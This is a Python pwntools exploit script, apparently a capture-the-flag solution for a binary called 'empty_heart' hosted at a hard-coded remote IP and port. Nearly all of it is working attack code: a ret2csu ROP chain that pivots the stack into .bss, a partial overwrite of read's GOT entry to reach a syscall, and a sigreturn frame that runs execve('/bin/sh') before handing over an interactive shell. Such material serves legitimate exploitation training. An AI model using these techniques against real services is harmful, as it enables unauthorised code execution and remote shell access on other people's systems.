#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 94.237.68.111 --port 1024 ./empty_heart
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./empty_heart')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '94.237.68.111'
port = int(args.PORT or 1024)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000000000400686
b *0x4006f4
continue
c
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


if args.LOCAL :
    libc = exe.libc
else :
    libc = ELF("libc.so.6")

read_got = exe.got["read"]
read_plt = exe.plt["read"]
leave = 0x400685 # 0x400685 <main+45>        leave

bss= 0x0000000000601000
stack_bss = bss + 0x100

len_csu = 120

pop_csu = 0x4006ea
call_csu = 0x4006d0

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0):
    p_csu = p64(pop_csu)
    p_csu += p64(0) # rbx
    p_csu += p64(0+1) # rbp
    p_csu += p64(call_func) # r12
    p_csu += p64(edi) # r13
    p_csu += p64(rsi) # r14
    p_csu += p64(rdx) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

io = start()

p = 'a'*32
p+= p64(0) # pop rbp
p+= ret2csu(read_got, 0, stack_bss + 0x8, 0x300, rbp_a = stack_bss )
p+= p64(leave) #leave  mov rsp,rbp; pop rbp; ret

# p = p.ljust(0xc6,"A")
io.send(p)

# overwrite lsb dari read_got menjadi \x4f (syscall)
p  = ret2csu(read_got, 0, read_got, 1, rbp_a = stack_bss + 0x8 + len_csu)  # 120
p += p64(0x400680) # <main+40>        mov    eax, 0x0 ; leave ; ret
print (len(p)) # 128(0x80) + 16(0x10) = 0x90
p += ret2csu(read_got, 0, stack_bss, 15) # ret #rbp_a = bss + 0x10 + 0x200 # bss + 0x590
p += p64(read_plt)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = stack_bss #/bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rip = read_plt
p += str(frame)

p = p.ljust(0x300,"\x00")

io.send(p)
if args.LOCAL :
    io.send("\x8c")
else :
    io.send("\x4f")

io.send("/bin/sh\x00".ljust(15,'\x00'))

io.interactive()
